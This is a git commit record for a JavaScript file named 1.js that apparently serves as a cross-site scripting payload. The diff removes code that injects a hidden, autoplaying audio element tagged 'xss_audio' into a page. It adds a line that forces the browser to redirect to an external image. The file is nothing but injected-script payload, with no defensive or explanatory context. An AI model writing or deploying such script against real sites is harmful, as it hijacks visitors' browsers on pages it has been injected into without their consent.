a06397165832ad4fd970ef18a6533d7550a74416
andy1337 <oneshot2k12@gmail.com>
2020-04-12 16:57:16 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,8 +1,1 @@
-if(document.getElementById('xss_audio') == null ) {
-	var a = document.createElement('audio');
-	a.src = "https://cs1-48v4.vkuseraudio.net/p17/9b698dc28a58d8.mp3"
-	a.autoplay=true;
-	a.id='xss_audio';
-	a.style.display='none';
-	document.body.appendChild(a);
-}
+window.location.href = "https://i.imgur.com/xOfdgB7.png";
